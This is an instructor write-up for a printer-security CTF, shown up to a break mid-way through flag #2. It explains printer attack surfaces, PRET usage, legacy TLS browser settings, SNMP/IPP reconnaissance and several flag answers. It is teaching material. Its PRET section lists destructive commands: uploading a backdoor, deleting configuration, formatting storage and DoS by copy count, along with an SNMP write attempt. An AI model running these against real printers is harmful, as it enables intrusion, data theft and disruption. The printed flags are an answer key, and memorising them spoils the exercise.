# HP Printer IoT Security CTF - Instructor Writeup

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [IoT Printer Penetration Testing Pedagogy](#iot-printer-penetration-testing-pedagogy)
- [Initial Setup and Tool Installation](#initial-setup-and-tool-installation)
- [PRET Framework - Essential Printer Exploitation Tool](#pret-framework---essential-printer-exploitation-tool)
- [Legacy Protocol Configuration for Browser Access](#legacy-protocol-configuration-for-browser-access)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Flag Discovery and Exploitation](#flag-discovery-and-exploitation)
  - [Flag #1: SNMP sysLocation - LUKE](#flag-1-snmp-syslocation---luke)
  - [Flag #2: SNMP sysContact - LEIA](#flag-2-snmp-syscontact---leia)
  - [Flag #3: Web Interface Configuration - HAN](#flag-3-web-interface-configuration---han)
  - [Flag #4: Print Job Author Metadata - PADME](#flag-4-print-job-author-metadata---padme)
  - [Flag #5: Print Job Title/Name - MACE](#flag-5-print-job-titlename---mace)
- [Attack Flow Summary](#attack-flow-summary)
- [Key Takeaways and Defense](#key-takeaways-and-defense)

---

## Challenge Overview

**Target System**: HP Multi-Function Printer (MFP)  
**IP Address**: 192.168.1.131  
**Attacker System**: Kali Linux (same network)  
**Total Flags**: 5 (demonstrating different printer attack vectors)  
**Protocols**: SNMP, IPP, HTTP/HTTPS, Raw Printing (Port 9100)  
**Focus**: OWASP IoT vulnerabilities specific to network printers

**Flag Distribution**:
- 2 SNMP-based flags (information disclosure)
- 1 Web interface configuration flag
- 2 Print job metadata flags

---

## IoT Printer Penetration Testing Pedagogy

### Teaching Philosophy for Printer Security

This section provides instructors with comprehensive frameworks for teaching network printer security assessment. Printers represent a unique IoT attack surface often overlooked in security assessments, yet they process sensitive documents, store credentials, and have network access to critical infrastructure.

### Core Security Issues in Network Printers

#### Why Printers Are Critical IoT Targets

**Traditional View vs. Reality**:

**Traditional View**:
- Printers are simple output devices
- Limited attack surface
- No sensitive data storage
- Isolated from critical systems
- Low priority for security

**Reality**:
- Full Linux/Unix systems with network capabilities
- Store documents, credentials, and logs
- Connected to multiple network segments
- Process sensitive information (HR, legal, financial)
- Often have outdated firmware with known vulnerabilities
- Trusted devices with minimal security monitoring

**Teaching Approach**: Begin by demonstrating that modern printers are complex computers. Show students the output of a port scan revealing multiple services. This paradigm shift is critical for understanding printer security.

#### Printer-Specific Attack Vectors

**Document Processing Pipeline**:
```
User → Print Driver → Network → Print Server → Printer → Output
         ↓               ↓            ↓           ↓         ↓
     Credentials    MITM Risk    Queue Leak   Memory    Physical
```

**Each Stage Has Vulnerabilities**:
- **Print Driver**: May leak metadata or credentials
- **Network Transport**: Often unencrypted (IPP, LPR, Raw)
- **Print Server**: Stores jobs temporarily, may log everything
- **Printer Memory**: Retains documents after printing
- **Physical Output**: Forgotten documents, unauthorized access

**Teaching Methodology**: Use a whiteboard to diagram the complete print pipeline. Have students identify potential attack points at each stage. This visual approach helps conceptualize the attack surface.

#### Unique Printer Protocols

**SNMP (Simple Network Management Protocol)**:
- Often enabled by default
- Community strings frequently "public" or "private"
- Exposes extensive device information
- Can modify device configuration
- Reveals network topology

**IPP (Internet Printing Protocol)**:
- HTTP-based protocol
- May lack authentication
- Exposes job history and metadata
- Can retrieve printed documents
- Administrative functions accessible

**Raw Printing (Port 9100)**:
- Direct communication with print engine
- No authentication mechanism
- Accepts PostScript/PCL commands
- Can execute device commands
- Potential for firmware manipulation

**PJL (Printer Job Language)**:
- HP-specific protocol
- File system access commands
- Configuration changes
- Information disclosure
- Potential code execution

**Teaching Point**: Each protocol was designed for functionality, not security. Students must understand that convenience features become vulnerabilities when devices are network-connected.

### Printer Information Disclosure

#### SNMP Enumeration Methodology

**Why SNMP Matters for Printers**:
- Management protocol present on most network printers
- Often misconfigured with default community strings
- Provides extensive device and network information
- Can reveal sensitive configuration data
- Allows remote configuration changes

**MIB (Management Information Base) Structure**:
```
1.3.6.1 (iso.org.dod.internet)
├── 1.3.6.1.2.1 (mgmt.mib-2)
│   ├── 1.3.6.1.2.1.1 (system)
│   ├── 1.3.6.1.2.1.25 (host)
│   └── 1.3.6.1.2.1.43 (printer-mib)
└── 1.3.6.1.4.1 (private.enterprises)
    └── 1.3.6.1.4.1.11 (hp)
```

**Critical OIDs for Printer Reconnaissance**:
- **System Information**: 1.3.6.1.2.1.1.*
- **Network Configuration**: 1.3.6.1.2.1.4.*
- **Printer Status**: 1.3.6.1.2.1.43.*
- **Stored Documents**: 1.3.6.1.4.1.11.* (vendor-specific)

**Teaching Exercise**: Have students manually walk the SNMP tree and document what each OID reveals. This builds understanding of information hierarchy and disclosure risks.

#### IPP Information Gathering

**IPP Operations for Intelligence Collection**:
```
Get-Printer-Attributes → Device capabilities and configuration
Get-Jobs → Job history with metadata
Get-Job-Attributes → Detailed job information
Get-Notifications → Event subscriptions
```

**Teaching Methodology**: IPP is HTTP-based, making it familiar to students who understand web protocols. Emphasize that it's essentially a web API for printing, with all associated API security concerns.

### Print Job Intelligence

#### Metadata Extraction

**What Print Jobs Reveal**:
- **User Information**: Who printed what and when
- **Document Metadata**: Titles, applications, timestamps
- **Network Information**: Source IPs, hostnames
- **Content Indicators**: Page counts, color usage
- **Patterns**: Work schedules, project names

**PostScript Document Structure**:
```postscript
%!PS-Adobe-3.0
%%Title: Confidential Report
%%Author: John Doe
%%Creator: Microsoft Word
%%CreationDate: 2024-01-15
%%Pages: 10
```

**Teaching Point**: Print job metadata is rarely sanitized. Users don't realize this information is transmitted and stored. This creates intelligence gathering opportunities.

#### Job Retention and Recovery

**Where Jobs Are Stored**:
- **Print Queue**: Active and recently completed jobs
- **Printer Memory**: RAM and hard drives
- **Backup Systems**: Network storage, cloud services
- **Log Files**: Detailed activity records

**Recovery Techniques**:
- IPP Get-Jobs operations
- SNMP job table queries
- Web interface job history
- Memory extraction (physical access)
- Network traffic capture

**Real-World Impact**: Demonstrate how print job recovery could expose:
- Merger and acquisition documents
- Employee personal information
- Financial reports
- Legal documents
- Intellectual property

### Advanced Printer Attacks

#### Cross-Site Print Attacks

**Concept**: Forcing a printer to print from an attacker-controlled source.

**Attack Flow**:
1. Identify printer with open services
2. Craft malicious print job
3. Submit job via IPP/Raw printing
4. Printer fetches and executes content
5. Potential for XSS, data theft, or physical harassment

**Teaching Demonstration**: Show how submitting a PostScript file with embedded commands can make the printer perform unexpected actions.

#### Firmware Manipulation

**Why Firmware Attacks Matter**:
- Persistence across reboots
- Difficult to detect
- Can survive factory resets
- Affects all jobs processed
- Creates permanent backdoor

**Attack Vectors**:
- PJL firmware update commands
- Web interface update function
- SNMP configuration changes
- Physical port access
- Supply chain attacks

**Teaching Approach**: Discuss the challenge of verifying firmware integrity in printers. Most organizations never check printer firmware, making them ideal persistence mechanisms.

---

## Initial Setup and Tool Installation

### Required Tools and Installation

```bash
# Update Kali repositories
sudo apt update

# SNMP Tools - Essential for printer reconnaissance
sudo apt install -y snmp snmpd snmp-mibs-downloader
# Download MIB definitions for human-readable output
sudo download-mibs
# Enable MIB resolution
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf

# IPP Tools - For Internet Printing Protocol interaction
sudo apt install -y cups-ipp-utils
sudo apt install -y ipptool
# CUPS provides additional utilities
sudo apt install -y cups-client

# Network Scanning
sudo apt install -y nmap
sudo apt install -y netcat-traditional

# Web Interface Testing
sudo apt install -y curl wget
sudo apt install -y nikto
sudo apt install -y gobuster

# PostScript and Document Analysis
sudo apt install -y ghostscript
sudo apt install -y poppler-utils
sudo apt install -y enscript

# Printer Exploitation Framework (PRET)
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
# PRET requires Python 2 or 3
sudo apt install -y python3 python3-pip
pip3 install colorama pysnmp

# Additional Analysis Tools
sudo apt install -y wireshark
sudo apt install -y tcpdump
sudo apt install -y hexdump

# Create working directory for CTF
mkdir -p ~/ctf/hp_printer
cd ~/ctf/hp_printer
```

### Tool Verification and Testing

```bash
# Verify SNMP tools
snmpwalk --version
snmpget --version

# Verify IPP tools
ipptool --version
lpstat --version

# Test PRET installation
cd ~/PRET
python3 pret.py --help

# Verify PostScript tools
gs --version
ps2pdf --version

# Create test directories
mkdir -p ~/ctf/hp_printer/{reconnaissance,snmp,ipp,print_jobs,web}
```

**Instructor Note**: Ensure all students have successfully installed these tools before proceeding. PRET is particularly important as it automates many printer-specific attacks.

---

## PRET Framework - Essential Printer Exploitation Tool

### Introduction to PRET

**Teaching Methodology**: Before beginning the CTF, students must understand PRET (Printer Exploitation Toolkit) as it's the industry-standard tool for printer penetration testing. While PRET won't directly reveal the CTF flags (which are embedded in metadata and configuration), it's essential for real-world printer security assessments.

### What is PRET?

PRET is a comprehensive printer security testing framework that supports:
- **PostScript (PS)**: Full filesystem access, memory manipulation
- **Printer Job Language (PJL)**: HP-specific protocol for configuration and control
- **Printer Command Language (PCL)**: Page description and device control

**Real-World Capabilities**:
```
Reconnaissance     │  Exploitation        │  Post-Exploitation
─────────────────┼────────────────────┼──────────────────
Device Info       │  Credential Theft    │  Backdoor Installation
Filesystem Enum   │  File Manipulation   │  Persistence
Memory Dumping    │  Config Changes      │  Data Exfiltration
Network Mapping   │  Firmware Updates    │  Malware Deployment
```

### PRET Installation and Basic Usage

```bash
# Navigate to PRET directory (already cloned in setup)
cd ~/PRET

# View help and understand capabilities
python3 pret.py --help

# Basic connection methods:
# 1. PostScript mode (most powerful)
python3 pret.py 192.168.1.131 ps

# 2. PJL mode (HP-specific features)
python3 pret.py 192.168.1.131 pjl

# 3. PCL mode (limited capabilities)
python3 pret.py 192.168.1.131 pcl
```

### Demonstrating PRET Capabilities

**Step 1: Initial Connection**

```bash
# Connect using PostScript
python3 pret.py 192.168.1.131 ps
```

**Expected PRET Interface**:
```
      ________________
     |___________     |
     |  _________     |
     | |   ..    |    |
     | |   ()    |    |
     | |_________|    |
     |___________     |
     |___________|    |
    /             \   |
   /_______________\  |
   |_______________|  |
       | | | | | |    |
      _|_|_|_|_|_|____/
       PRET v0.5.1

(ASCII art printer)

Connection to 192.168.1.131 established
Device:   HP LaserJet MFP M428fdw
Welcome to PRET shell. Type help or ? to list commands.
192.168.1.131:/>
```

**Step 2: Basic Reconnaissance Commands**

```bash
# Within PRET shell:
192.168.1.131:/> help

# Device information
192.168.1.131:/> info
Manufacturer: HP
Model: LaserJet MFP M428fdw
Serial: XXXXXXXXXX
Firmware: 2.7.0
Memory: 256MB

# Filesystem discovery (if accessible)
192.168.1.131:/> ls
0:/ 
1:/StorageCard/
2:/Firmware/

# Try to list files
192.168.1.131:/> ls 0:/
[May return: Permission Denied or empty]

# Check for known files
192.168.1.131:/> get /etc/passwd
[Usually fails on modern printers]
```

**Step 3: Why PRET Fails for This CTF**

**Instructor Teaching Point**: PRET is designed for direct printer exploitation, not metadata analysis. The CTF flags are in:
- SNMP MIB values (PRET doesn't query SNMP)
- IPP job metadata (PRET uses different protocols)
- Web configuration (PRET doesn't interact with web interface)

This teaches students an important lesson: **No single tool solves everything**.

```bash
# Demonstrate PRET limitations:
192.168.1.131:/> find FLAG
[No results - flags aren't in filesystem]

192.168.1.131:/> config
[Shows device config but not SNMP/IPP data]

192.168.1.131:/> print /etc/passwd
[Attempts to print file, not retrieve it]
```

### Real-World PRET Attacks

**Teaching Demonstration**: Show what PRET CAN do in real assessments:

**1. Credential Harvesting**:
```bash
192.168.1.131:/> capture
# Captures print jobs in memory
# May contain passwords in documents

192.168.1.131:/> dumpjobs
# Dumps job queue with potential sensitive data
```

**2. Configuration Manipulation**:
```bash
192.168.1.131:/> set copies 9999
# DoS by setting excessive copies

192.168.1.131:/> set economode off
# Waste toner/ink

192.168.1.131:/> lock
# Lock printer panel
```

**3. Filesystem Access** (if vulnerable):
```bash
192.168.1.131:/> put backdoor.ps
# Upload malicious PostScript

192.168.1.131:/> delete 0:/config.sys
# Delete configuration files

192.168.1.131:/> format 1:/
# Format storage cards
```

**4. Network Attacks**:
```bash
192.168.1.131:/> discover
# Network discovery from printer's perspective

192.168.1.131:/> scan 192.168.1.0/24
# Port scan from printer
```

### PJL-Specific Commands

```bash
# Connect with PJL mode
python3 pret.py 192.168.1.131 pjl

192.168.1.131:/> env
# Show all environment variables
COPIES=1
DUPLEX=OFF
PAPER=LETTER

192.168.1.131:/> volumes
# List storage volumes
0: RAM
1: FLASH
2: CARD

192.168.1.131:/> pwd
# Print working directory
```

### Teaching Exercise: PRET Reconnaissance Report

Have students create a systematic PRET reconnaissance report:

```bash
#!/bin/bash
# PRET Reconnaissance Script

echo "=== PRET Printer Reconnaissance ==="
echo "Target: 192.168.1.131"
echo "Date: $(date)"
echo ""

# Test PostScript
echo "[*] Testing PostScript..."
echo -e "info\nquit\n" | python3 ~/PRET/pret.py 192.168.1.131 ps 2>&1 | head -20

# Test PJL
echo "[*] Testing PJL..."
echo -e "info\nenv\nquit\n" | python3 ~/PRET/pret.py 192.168.1.131 pjl 2>&1 | head -20

# Test PCL
echo "[*] Testing PCL..."
echo -e "info\nquit\n" | python3 ~/PRET/pret.py 192.168.1.131 pcl 2>&1 | head -20
```

### Why PRET Matters Despite CTF Limitations

**Key Teaching Points**:

1. **Industry Standard Tool**: Used in professional printer assessments
2. **Protocol Understanding**: Teaches PS/PJL/PCL protocols
3. **Attack Surface Awareness**: Shows printer capabilities beyond printing
4. **Tool Limitations**: No tool is comprehensive - multiple tools needed
5. **Real-World Relevance**: These attacks work on many production printers

**Common Student Mistakes**:
- Expecting PRET to find all vulnerabilities
- Not understanding protocol differences (PS vs PJL vs PCL)
- Giving up when filesystem access is denied
- Not documenting negative results (also valuable intelligence)
- Missing that PRET success depends on printer model/configuration

**When to Use PRET vs Other Tools**:

| Scenario | Tool Choice | Reason |
|----------|------------|---------|
| Filesystem access | PRET | Direct PS/PJL commands |
| SNMP enumeration | snmpwalk | PRET doesn't do SNMP |
| Job metadata | ipptool | PRET doesn't parse IPP |
| Web interface | Browser/curl | PRET doesn't do HTTP |
| Memory dumping | PRET | Has memory access commands |
| Firmware analysis | binwalk | PRET can download, not analyze |

### Transitioning from PRET to Other Tools

**Instructor Script**: "Now that we've seen PRET's capabilities and limitations, we understand that printer assessment requires multiple tools. For this CTF, we'll need to use SNMP, IPP, and web protocols that PRET doesn't cover. This mimics real assessments where you start with PRET for quick wins, then move to protocol-specific tools for deeper analysis."

---

## Legacy Protocol Configuration for Browser Access

### Understanding Legacy TLS/SSL Issues

**Teaching Methodology**: Modern printers often use outdated TLS/SSL protocols that current browsers reject by default. This section teaches students how to handle legacy protocols safely in a lab environment.

### The Problem

When accessing the printer's web interface (https://192.168.1.131), students may encounter:
- "SSL_ERROR_UNSUPPORTED_VERSION"
- "ERR_SSL_VERSION_OR_CIPHER_MISMATCH"
- "Secure Connection Failed"
- "This site can't provide a secure connection"

**Why This Happens**:
```
Modern Browser                    Legacy Printer
─────────────                    ──────────────
TLS 1.2 minimum      <--X-->     TLS 1.0 / SSL 3.0
Strong ciphers only  <--X-->     Weak ciphers (DES, RC4)
Certificate validation <--X-->    Self-signed certificates
HSTS enforcement     <--X-->     No security headers
```

### Firefox Configuration for Legacy Protocols

**Step 1: Access Firefox Advanced Configuration**

```bash
# Launch Firefox from terminal to see any errors
firefox &

# In the browser address bar, type:
about:config

# Click "Accept the Risk and Continue" when warned
```

**Teaching Point**: The about:config warning exists because these changes can compromise security. Students must understand they should ONLY do this in isolated lab environments.

**Step 2: Modify TLS Settings**

**Search and modify each setting carefully**:

```javascript
// Setting 1: Enable deprecated TLS versions
Search: security.tls.version.enable-deprecated
Current: false
Change to: true
```

**How to change**:
1. Type `security.tls.version.enable-deprecated` in search box
2. Double-click the row or click the toggle button
3. Value changes from `false` to `true`

```javascript
// Setting 2: Lower minimum TLS version
Search: security.tls.version.min
Current: 3 (TLS 1.2)
Change to: 1 (TLS 1.0)
```

**TLS Version Values**:
- 1 = TLS 1.0 (legacy)
- 2 = TLS 1.1 (deprecated)
- 3 = TLS 1.2 (current minimum)
- 4 = TLS 1.3 (modern)

```javascript
// Setting 3: Lower fallback limit
Search: security.tls.version.fallback-limit
Current: 4
Change to: 1
```

**Step 3: Additional Cipher and Certificate Settings**

```javascript
// Setting 4: Allow weak ciphers (if needed)
Search: security.ssl3
// Look for any ssl3 or cipher settings that might be disabled

// Setting 5: Override certificate errors
Search: security.tls.insecure_fallback_hosts
// Add the printer IP if necessary: 192.168.1.131
```

### Alternative: Creating a Lab Profile

**Best Practice**: Create a separate Firefox profile for legacy testing:

```bash
# Create new profile for legacy systems
firefox -ProfileManager

# Click "Create Profile"
# Name it: "Legacy_Testing"
# Start Firefox with this profile
firefox -P Legacy_Testing

# Now apply the about:config changes only to this profile
```

**Profile Advantages**:
- Keeps main browser secure
- Easy to delete after lab
- Can have different settings per lab
- Prevents accidental insecure browsing

### Command-Line Alternatives

When browser access fails completely, use command-line tools:

```bash
# Test HTTPS with legacy protocols
curl -k --tlsv1.0 https://192.168.1.131

# Force specific ciphers
curl -k --ciphers 'DES-CBC-SHA:RC4-SHA' https://192.168.1.131

# Use wget with no certificate check
wget --no-check-certificate https://192.168.1.131

# OpenSSL connection test
openssl s_client -connect 192.168.1.131:443 -tls1
```

### Security Warnings for Students

**Critical Teaching Points**:

**⚠️ LAB ONLY SETTINGS ⚠️**

These changes significantly weaken browser security:
- Enables protocols with known vulnerabilities
- Allows weak encryption that can be broken
- Bypasses certificate validation
- Exposes to man-in-the-middle attacks

**After Lab Completion**:

```bash
# Reset all changes:
1. Type about:config
2. Search for "modified" in the search box
3. Reset each changed setting to default
4. Or delete the Legacy_Testing profile entirely

# Verify settings restored:
about:config
Search: security.tls
Confirm all values are back to defaults
```

### Troubleshooting Connection Issues

**Common Problems and Solutions**:

**Problem 1**: Still can't connect after TLS changes
```bash
# Solution: Check if it's HTTP not HTTPS
curl http://192.168.1.131
# Many printers use HTTP only on port 80
```

**Problem 2**: Certificate warnings persist
```bash
# Solution: Add permanent exception
1. Click "Advanced" on error page
2. Click "Accept the Risk and Continue"
3. Firefox saves exception for this site
```

**Problem 3**: Page loads but looks broken
```bash
# Solution: Mixed content blocking
about:config
Search: security.mixed_content.block_active_content
Set to: false (temporarily)
```

### Real-World Implications

**Why Legacy Protocols Exist in Printers**:

1. **Long Device Lifecycles**: Printers used for 10+ years
2. **Firmware Limitations**: Can't update TLS libraries
3. **Compatibility Priority**: Must work with old systems
4. **Cost Constraints**: Updates require expensive development
5. **User Expectations**: "It still prints, why replace it?"

**Security Risks in Production**:

```
Legacy Printer → Compromised → Lateral Movement → Network Breach
       ↓              ↓              ↓                ↓
   Weak TLS      Easy MITM      Credential      Full compromise
                               Theft
```

**Teaching Exercise**: SSL/TLS Analysis

Have students analyze the printer's SSL/TLS configuration:

```bash
#!/bin/bash
# SSL/TLS Analysis Script

echo "=== Printer SSL/TLS Analysis ==="

# Test supported protocols
echo "[*] Testing SSL/TLS versions..."
for proto in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
    echo -n "Testing $proto: "
    timeout 2 openssl s_client -connect 192.168.1.131:443 -$proto < /dev/null 2>/dev/null | \
        grep -q "Cipher" && echo "SUPPORTED" || echo "NOT SUPPORTED"
done

# Get certificate details
echo "[*] Certificate Information..."
echo | openssl s_client -connect 192.168.1.131:443 2>/dev/null | \
    openssl x509 -noout -text | grep -E "(Subject:|Issuer:|Not After)"

# Test cipher suites
echo "[*] Supported Ciphers..."
nmap --script ssl-enum-ciphers -p 443 192.168.1.131
```

### Moving Forward

With PRET tested and browser access configured, students can now proceed with the comprehensive enumeration using protocol-specific tools. Remember: PRET showed us what direct printer access can achieve, while the browser configuration taught us about legacy protocol challenges. Now we combine these lessons with SNMP, IPP, and web enumeration for complete assessment.

---

## Initial Reconnaissance

### Network Discovery and Service Enumeration

**Teaching Methodology**: Printer reconnaissance follows a specific pattern different from typical servers. Students must understand that printers expose multiple services, each providing different intelligence.

```bash
# Step 1: Verify target is online
ping -c 3 192.168.1.131
```

**Expected Output**:
```
PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
64 bytes from 192.168.1.131: icmp_seq=1 ttl=64 time=0.521 ms
64 bytes from 192.168.1.131: icmp_seq=2 ttl=64 time=0.456 ms
64 bytes from 192.168.1.131: icmp_seq=3 ttl=64 time=0.478 ms
```

**Step 2: Comprehensive Port Scan**

```bash
# Full TCP port scan with service detection
sudo nmap -sS -sV -p- -oA hp_printer_scan 192.168.1.131

# UDP scan for SNMP and other services
sudo nmap -sU -p 161,162,9100 192.168.1.131
```

**Expected Output**:
```
Starting Nmap 7.94
Nmap scan report for 192.168.1.131
Host is up (0.00052s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        HP HTTP Server 2.0
161/udp  open  snmp        SNMPv1 server; SNMPv2c server (public)
443/tcp  open  ssl/http    HP HTTP Server 2.0
631/tcp  open  ipp         HP IPP Server 2.0
9100/tcp open  jetdirect   HP JetDirect
```

**Instructor Teaching Points**:

**Port Analysis**:
- **Port 80/443 (HTTP/HTTPS)**: Web interface for configuration
- **Port 161 (SNMP)**: Management protocol, often misconfigured
- **Port 631 (IPP)**: Internet Printing Protocol for job submission
- **Port 9100 (JetDirect)**: Raw printing port, accepts direct commands

**Why These Ports Matter**:
- Multiple attack surfaces on a single device
- Each protocol has different authentication mechanisms
- Some protocols have no authentication at all
- Information gathered from one can aid attacks on another

### SNMP Reconnaissance

**Teaching Methodology**: SNMP is often the most information-rich protocol on printers. Students must learn systematic enumeration.

```bash
# Test SNMP access with default community string
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
```

**Expected Output**:
```
SNMPv2-MIB::sysDescr.0 = STRING: HP LaserJet MFP M428fdw
```

**Comprehensive SNMP Enumeration**:

```bash
# Walk entire SNMP tree (verbose but complete)
snmpwalk -v2c -c public 192.168.1.131 > snmp_full_walk.txt

# System information specifically
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1
```

**Key SNMP Information to Document**:

```bash
# System description
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0

# System uptime (reveals reboot schedule)
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.3.0

# System contact (often contains administrator info)
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0

# System location (physical location disclosure)
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0

# System name
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.5.0
```

**Teaching Exercise**: Have students create an "SNMP intelligence report" documenting all discovered information before looking for flags. This builds reconnaissance discipline.

### IPP Service Enumeration

```bash
# Create IPP test file for Get-Printer-Attributes
cat > get-printer-attributes.test << 'EOF'
{
    NAME "Get Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF

# Query printer attributes
ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test
```

**Teaching Point**: IPP enumeration reveals printer capabilities, configuration, and supported operations. This information guides subsequent attacks.

### Web Interface Reconnaissance

```bash
# Check web interface
curl -I http://192.168.1.131

# Look for common printer web paths
gobuster dir -u http://192.168.1.131 -w /usr/share/wordlists/dirb/common.txt

# Nikto scan for vulnerabilities
nikto -h http://192.168.1.131
```

**Common Printer Web Paths**:
- `/hp/device/this.LCDispatcher` - HP configuration
- `/info_config.html` - Information/configuration
- `/maintenance/index.html` - Maintenance functions
- `/job/job_history.htm` - Job history
- `/scan/scan_to_email.htm` - Scan functions

---

## Flag Discovery and Exploitation

### Flag #1: SNMP sysLocation - LUKE

**Location**: SNMP OID 1.3.6.1.2.1.1.6.0 (sysLocation)  
**Flag**: `FLAG{LUKE47239581}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Teaching Methodology**:

**Concept**: The SNMP sysLocation field is intended to store the physical location of a device. However, it's a writable string field often misused for additional information storage. This flag demonstrates information disclosure through SNMP and shows how the same data may be accessible through multiple protocols.

**Why sysLocation Contains Sensitive Data**:
- Administrators use it for extended device descriptions
- No input validation or format requirements
- Visible through both SNMP and IPP protocols
- Often contains more than just location
- Rarely monitored or audited

**Discovery Process**:

**Step 1: SNMP Enumeration**

```bash
# Query sysLocation specifically
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
```

**Expected Output**:
```
SNMPv2-MIB::sysLocation.0 = STRING: OC-Server-Room-B | FLAG{LUKE47239581}
```

**Realistic Discovery Method**:

Instead of searching for "FLAG", professional penetration testers enumerate ALL system information and READ it carefully:

```bash
# Professional approach: Complete system enumeration
echo "=== SNMP System Information Enumeration ===" > snmp_system_info.txt

# Query all standard system OIDs
for oid in 1 2 3 4 5 6 7; do
    echo "" >> snmp_system_info.txt
    echo "System OID 1.3.6.1.2.1.1.$oid.0:" >> snmp_system_info.txt
    snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.$oid.0 2>/dev/null >> snmp_system_info.txt
done

# Now READ the complete output
cat snmp_system_info.txt
```

**Reading the Output**:
```
=== SNMP System Information Enumeration ===

System OID 1.3.6.1.2.1.1.1.0:
SNMPv2-MIB::sysDescr.0 = STRING: HP LaserJet MFP M428fdw

System OID 1.3.6.1.2.1.1.2.0:
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.11.2.3.9.1

System OID 1.3.6.1.2.1.1.3.0:
SNMPv2-MIB::sysUpTime.0 = Timeticks: (8640000) 1 day, 0:00:00.00

System OID 1.3.6.1.2.1.1.4.0:
SNMPv2-MIB::sysContact.0 = STRING: OVERCLOCK@OC.local | FLAG{LEIA83920174}

System OID 1.3.6.1.2.1.1.5.0:
SNMPv2-MIB::sysName.0 = STRING: HP-Printer-OC

System OID 1.3.6.1.2.1.1.6.0:
SNMPv2-MIB::sysLocation.0 = STRING: OC-Server-Room-B | FLAG{LUKE47239581}

System OID 1.3.6.1.2.1.1.7.0:
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

**Teaching Point**: By reading ALL information systematically, we discover:
- Device model and description
- Uptime (useful for maintenance windows)
- Contact information with embedded data
- Location with additional identifier
- Multiple flags in different fields

**Instructor Analysis**:

The response shows:
- **Physical Location**: "OC-Server-Room-B" (reveals building layout)
- **Flag**: `FLAG{LUKE47239581}` (additional data appended)
- **Pipe Separator**: Indicates multiple data fields

**Why This Is Realistic**:
- Administrators often embed asset tags, serial numbers, or identifiers
- The field accepts any string without validation
- Common practice to store multiple pieces of information

**Step 2: Verify Through IPP Protocol**

This flag is also visible through IPP, demonstrating protocol overlap:

```bash
# Create comprehensive IPP attribute query
cat > get-all-printer-attributes.test << 'EOF'
{
    NAME "Get All Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF

# Execute IPP query and save full output
ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-printer-attributes.test > ipp_full_attributes.txt

# Read through the complete output systematically
less ipp_full_attributes.txt
# Use '/' to search within less for terms like: location, info, contact, admin
```

**Reading IPP Output** (relevant sections):
```
printer-info (textWithoutLanguage) = HP-MFP-FLAG{HAN62947103}
printer-location (textWithoutLanguage) = OC-Server-Room-B | FLAG{LUKE47239581}
printer-make-and-model (textWithoutLanguage) = HP LaserJet MFP M428fdw
printer-name (nameWithoutLanguage) = HP_LaserJet_MFP_M428fdw
printer-operator (nameWithoutLanguage) = Administrator
```

**Teaching Points**:

1. **Multiple Protocol Access**: Same information accessible via SNMP and IPP
2. **Information Redundancy**: Attackers can try multiple protocols if one fails
3. **Physical Security**: Location disclosure aids physical attacks
4. **Asset Tracking**: Embedded identifiers reveal inventory systems

**Step 3: Understanding SNMP Write Access**

```bash
# Check if we can modify sysLocation (common misconfiguration)
snmpset -v2c -c private 192.168.1.131 1.3.6.1.2.1.1.6.0 s "New Location"

# If successful, this allows:
# - Information hiding
# - Misdirection
# - Persistent data storage
```

**Extended Analysis - Professional Enumeration**:

```bash
# Complete SNMP walk to discover ALL information
snmpwalk -v2c -c public 192.168.1.131 > complete_snmp_walk.txt

# Analyze the complete output for intelligence
echo "=== SNMP Intelligence Analysis ==="
echo "[*] Total OIDs discovered: $(wc -l < complete_snmp_walk.txt)"
echo "[*] System information:"
head -20 complete_snmp_walk.txt
echo ""
echo "[*] Reading through complete enumeration..."
# Now manually read through the file
less complete_snmp_walk.txt
```

**Real-World Implications**:
- **Physical Security**: Knowing "Server-Room-B" aids physical intrusion
- **Network Mapping**: Device location helps understand network topology
- **Social Engineering**: Location information aids pretexting
- **Compliance Issues**: Location data may violate security policies

**Common Student Mistakes**:
- Using grep to search for specific patterns instead of reading completely
- Only checking default system OIDs, missing vendor-specific ones
- Not trying both SNMP versions (v1, v2c, v3)
- Forgetting to check IPP for the same information
- Not documenting physical location intelligence

**Defensive Recommendations**:
- Limit sysLocation to actual location only
- Disable SNMP if not required
- Use SNMPv3 with authentication and encryption
- Monitor SNMP queries for reconnaissance
- Implement access control lists for SNMP

---

### Flag #2: SNMP sysContact - LEIA

**Location**: SNMP OID 1.3.6.1.2.1.1.4.0 (sysContact)  
**Flag**: `FLAG{LEIA83920174}`  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Teaching Methodology**:

**Concept**: The sysContact field stores administrator contact information but often contains additional data. This flag is ONLY visible through SNMP, not IPP, demonstrating protocol-specific information disclosure.

**Why sysContact Is Security-Relevant**:
- Contains administrator email addresses
- May include phone numbers
- Often has IT staff names
- Can reveal organizational structure
- Used for social engineering

**Discovery Process**:

**Step 1: Systematic SNMP Enumeration**

